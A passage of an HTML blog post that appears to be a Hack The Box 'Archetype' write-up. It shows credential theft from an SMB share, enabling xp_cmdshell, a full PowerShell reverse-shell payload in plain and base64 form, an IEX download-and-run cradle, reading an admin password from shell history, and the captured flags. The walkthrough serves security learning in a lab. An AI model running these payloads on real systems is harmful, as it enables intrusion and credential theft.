+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5056511</span> blocks of size 4096. <span style="color:#ae81ff">2617733</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get prod.dtsConfig
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\p</span>rod.dtsConfig of size <span style="color:#ae81ff">609</span> as prod.dtsConfig <span style="color:#f92672">(</span>1.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.1 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> exit
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>prod.dtsConfig</span></span></code></pre></div></div>
+<p><em>Note: I did not probe the <code>IPC$</code> share as it does not hold actual browsable files, IPC stands for Inter-Process Communication, allows processes to communicate between machines.</em></p>
+<p>Examining the downloaded file, I was able to view plaintext credentials for the user <code>ARCHETYPE/sql_svc</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat prod.dtsConfig
+</span></span><span style="display:flex;"><span>&lt;DTSConfiguration&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>	&lt;ConfiguredValue&gt;Data Source<span style="color:#f92672">=</span>.;Password<span style="color:#f92672">=</span>M3g4c0rp123;User ID<span style="color:#f92672">=</span>ARCHETYPE<span style="color:#ae81ff">\s</span>ql_svc;Initial Catalog<span style="color:#f92672">=</span>Catalog;Provider<span style="color:#f92672">=</span>SQLNCLI10.1;Persist Security Info<span style="color:#f92672">=</span>True;Auto Translate<span style="color:#f92672">=</span>False;&lt;/ConfiguredValue&gt;
+</span></span><span style="display:flex;"><span>    &lt;/Configuration&gt;
+</span></span><span style="display:flex;"><span>&lt;/DTSConfiguration&gt;</span></span></code></pre></div></div>
+<p><em>Password: M3g4c0rp123</em></p>
+
+<h2 class="relative group"><em>Lateral Movement</em>
+    <div id="lateral-movement" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#lateral-movement" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>At this step, I used the retrieved credentials to authenticate and interact with the mssql service via Impacket&rsquo;s mssqlclient.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@&lt;target-IP&gt; -windows-auth
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/impacket/mssql/version.py:182: SyntaxWarning: <span style="color:#e6db74">&#39;return&#39;</span> in a <span style="color:#e6db74">&#39;finally&#39;</span> block
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> string
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Encryption required, switching to TLS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>DATABASE<span style="color:#f92672">)</span>: Old Value: master, New Value: master
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>LANGUAGE<span style="color:#f92672">)</span>: Old Value: , New Value: us_english
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ENVCHANGE<span style="color:#f92672">(</span>PACKETSIZE<span style="color:#f92672">)</span>: Old Value: 4096, New Value: <span style="color:#ae81ff">16192</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>ARCHETYPE<span style="color:#f92672">)</span>: Line 1: Changed database context to <span style="color:#e6db74">&#39;master&#39;</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> INFO<span style="color:#f92672">(</span>ARCHETYPE<span style="color:#f92672">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ACK: Result: <span style="color:#ae81ff">1</span> - Microsoft SQL Server <span style="color:#ae81ff">2017</span> RTM <span style="color:#f92672">(</span>14.0.1000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">(</span>ARCHETYPE<span style="color:#ae81ff">\s</span>ql_svc  dbo@master<span style="color:#f92672">)</span>&gt; help
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lcd <span style="color:#f92672">{</span>path<span style="color:#f92672">}</span>                 - changes the current local directory to <span style="color:#f92672">{</span>path<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>exit                       - terminates the server process <span style="color:#f92672">(</span>and this session<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>enable_xp_cmdshell         - you know what it means
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span></span></span></code></pre></div></div>
+<p>With access to the service, the next thing to do was enabling command execution on the host OS through the ms sql service.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>SQL (ARCHETYPE\sql_svc  dbo@master)&gt; enable_xp_cmdshell
+</span></span><span style="display:flex;"><span>INFO(ARCHETYPE): Line 185: Configuration option &#39;show advanced options&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>INFO(ARCHETYPE): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+</span></span><span style="display:flex;"><span>SQL (ARCHETYPE\sql_svc  dbo@master)&gt; xp_cmdshell &#34;whoami&#34;
+</span></span><span style="display:flex;"><span>output              
+</span></span><span style="display:flex;"><span>-----------------   
+</span></span><span style="display:flex;"><span>archetype\sql_svc   
+</span></span><span style="display:flex;"><span>NULL</span></span></code></pre></div></div>
+<p><em><code>xp_cmdshell</code> is a built-in feature of Microsoft SQL server that acts as a bridge between the database and the (underlying) Windows OS, it passes the string to <code>cmd.exe</code> which executes it and prints the output in the SQL session.</em></p>
+
+<h2 class="relative group"><em>Post-Exploitation</em>
+    <div id="post-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#post-exploitation" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Having gained command execution, I aimed at getting a terminal session on the target by triggering a reverse shell.</p>
+<p><em>Reverse shell payload</em></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>xp_cmdshell <span style="color:#e6db74">&#34;powershell -c \&#34;</span>$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#39;&lt;target-IP&gt;&#39;</span>,<span style="color:#ae81ff">4444</span>);$stream = $client.GetStream();[<span style="color:#66d9ef">byte[]</span>]$bytes = <span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">.65535</span>|%{<span style="color:#ae81ff">0</span>};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, <span style="color:#ae81ff">0</span>, $bytes.Length)) <span style="color:#f92672">-ne</span> <span style="color:#ae81ff">0</span>){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,<span style="color:#ae81ff">0</span>, $i);$sendback = (iex $data <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span> | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#39;PS &#39;</span> + (pwd).Path + <span style="color:#e6db74">&#39;&gt; &#39;</span>;$sendbyte = ([<span style="color:#66d9ef">text.encoding</span>]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,<span style="color:#ae81ff">0</span>,$sendbyte.Length);$stream.Flush()};$client.Close()\<span style="color:#e6db74">&#34;&#34;</span> </span></span></code></pre></div></div>
+<p>To avoid a quoting hell, I encoded the payload in base64 format, powershell does the heavy lifting. MSSQL takes the command and passes it to <code>cmd.exe</code> which passes it to powershell, each of these layers has its own set of conflicting rules sorrounding single &amp; double quotes, using an encoded payload gets around all this.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>xp_cmdshell <span style="color:#e6db74">&#34;powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMgAzADgAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34;</span></span></span></code></pre></div></div>
+<p>I set a listener on my Local machine to &ldquo;catch&rdquo; the connection and get a shell.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>&lt;target-IP&gt;<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>&lt;target-IP&gt;<span style="color:#f92672">]</span> <span style="color:#ae81ff">49677</span>
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory: C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name                                                                  
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----                                                                  
+</span></span><span style="display:flex;"><span>d-----        9/15/2018   2:06 AM                <span style="color:#ae81ff">0409</span>                                                                  
+</span></span><span style="display:flex;"><span>d-----        1/19/2020   3:09 PM                <span style="color:#ae81ff">1033</span>                                                                  
+</span></span><span style="display:flex;"><span>d-----        7/27/2021   2:28 AM                AdvancedInstallers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span></span></span></code></pre></div></div>
+
+<h2 class="relative group"><em>Local Enumeration</em>
+    <div id="local-enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#local-enumeration" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>With shell access, The object was to enumerate the target to gather information that will aid in privilege escalation. To do this, I used the <code>winPEAS.ps1</code> script.</p>
+<ul>
+<li>Script download.</li>
+</ul>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
+</span></span><span style="display:flex;"><span>--2026-09-07 02:41:08--  https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
+</span></span><span style="display:flex;"><span>Resolving raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span>... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
+</span></span><span style="display:flex;"><span>Connecting to raw.githubusercontent.com <span style="color:#f92672">(</span>raw.githubusercontent.com<span style="color:#f92672">)</span>|185.199.111.133|:443... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">94970</span> <span style="color:#f92672">(</span>93K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘winPEAS.ps1’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>winPEAS.ps1                       100%<span style="color:#f92672">[==========================================================</span>&gt;<span style="color:#f92672">]</span>  92.74K   496KB/s    in 0.2s    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-09-07 02:41:09 <span style="color:#f92672">(</span><span style="color:#ae81ff">496</span> KB/s<span style="color:#f92672">)</span> - ‘winPEAS.ps1’ saved <span style="color:#f92672">[</span>94970/94970<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>prod.dtsConfig  winPEAS.ps1</span></span></code></pre></div></div>
+<ul>
+<li>Script Execution.</li>
+</ul>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; powershell -c <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).downloadString(&#39;http://&lt;tun0-address&gt;:8080/winPEAS.ps1&#39;) | Out-File -FilePath C:\Windows\Temp\winPEAS_output.txt&#34;</span></span></span></code></pre></div></div>
+<p>&hellip;</p>
+<p><em>While working on this section, specifically attempting enumeration through <code>winPEAS</code> scripts, my efforts were mostly futile. I tried running the files in memory using PowerShell&rsquo;s <code>Invoke-Expression</code> but the command would just hang, I wasn&rsquo;t(and still not) sure if it was due to lack of the required privileges, that aside, I couldn&rsquo;t even write into any folder except(<code>C:\Users\sql_svc</code>). I later tried to download the files from my local machine using <code>Invoke-WebRequest</code>, they would download just fine but running them wasn&rsquo;t successful.
+As a last ditch effort, I resorted to reading Hack The Box&rsquo;s official writeup and I noticed something, the author had used <code>winPEASx64.exe</code>, an executable written in C#, I wasn&rsquo;t sure if this was the key but I hoped it was considering I had been trying to enumerate using the <code>.ps1</code> &amp; <code>.bat</code> versions.
+The executable run just fine, among the torrent of output, I noticed the path to PowerShell history file, knowing that it had the administrators credentials, I had attained my object.</em></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>[<span style="color:#66d9ef">SNIP</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>???????????? PowerShell Settings (T1059.<span style="color:#ae81ff">001</span>)
+</span></span><span style="display:flex;"><span>    PowerShell v2 Version<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2.0</span>
+</span></span><span style="display:flex;"><span>    PowerShell v5 Version<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">5.1</span>.17763.1
+</span></span><span style="display:flex;"><span>    PowerShell Core Version<span style="color:#960050;background-color:#1e0010">:</span> 
+</span></span><span style="display:flex;"><span>    Transcription Settings<span style="color:#960050;background-color:#1e0010">:</span> 
+</span></span><span style="display:flex;"><span>    Module Logging Settings<span style="color:#960050;background-color:#1e0010">:</span> 
+</span></span><span style="display:flex;"><span>    Scriptblock Logging Settings<span style="color:#960050;background-color:#1e0010">:</span> 
+</span></span><span style="display:flex;"><span>    PS history file<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></span><span style="display:flex;"><span>    PS history size<span style="color:#960050;background-color:#1e0010">:</span> 79B</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>PS C:\Users\sql_svc&gt; type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</span></span><span style="display:flex;"><span>net.exe use T: \\Archetype\backups /user<span style="color:#960050;background-color:#1e0010">:</span>administrator MEGACORP_4dm1n!!
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>PS C:\Users\sql_svc&gt;</span></span></code></pre></div></div>
+<p><em>Administrator Credentials:</em></p>
+<ul>
+<li>Username: administrator</li>
+<li>Passwd: MEGACORP_4dm1n!!</li>
+</ul>
+
+<h4 class="relative group"><em>Privilege Escalation</em>
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>Having discovered the admin credentials, I used them to get a privileged PowerShell Session using <code>evil-winrm</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Bash" data-lang="Bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/PersonalProjos/HackTheBox/machines/Archetype<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.95.187 -u administrator -p <span style="color:#e6db74">&#39;MEGACORP_4dm1n!!&#39;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;</span></span></code></pre></div></div>
+<p>With system-wide access, the final object was finding the flags for the <code>sql_svc</code> user and the administrator.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator&gt; Get-ChildItem -Path C:\Users\sql_svc\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\sql_svc\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---        <span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">25</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">37</span> AM             <span style="color:#ae81ff">32</span> user.txt</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator&gt; Get-Content -Path C:\Users\sql_svc\Desktop\user.txt
+</span></span><span style="display:flex;"><span>3e7b102e78218e935bf3f4951fec21a3</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator&gt; Get-ChildItem -Path C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\Administrator\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---        <span style="color:#ae81ff">2</span>/<span style="color:#ae81ff">25</span>/<span style="color:#ae81ff">2020</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">36</span> AM             <span style="color:#ae81ff">32</span> root.txt</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator&gt; Get-Content -Path C:\Users\Administrator\Desktop\root.txt
+</span></span><span style="display:flex;"><span>b91ccec3305e98240082d4474b848528</span></span></code></pre></div></div>
+
+<h1 class="relative group">Conclusion.
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor">#</a>
+    </span>
+    
+</h1>
+<p>This machine showcases how service misconfiguration(and &ldquo;bad housekeeping&rdquo;) can lead to system compromise. Service credentials were left in a readable file in a publicly accessible share, this gave an initial foothold on the system which allowed me to further enumerate the system and discover the administrator credentials.</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/archetype-htb/posts/4-spmachine/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HackTheBox Responder Writeup.
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-09-10T00:00:00&#43;00:00">September 10, 2026</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
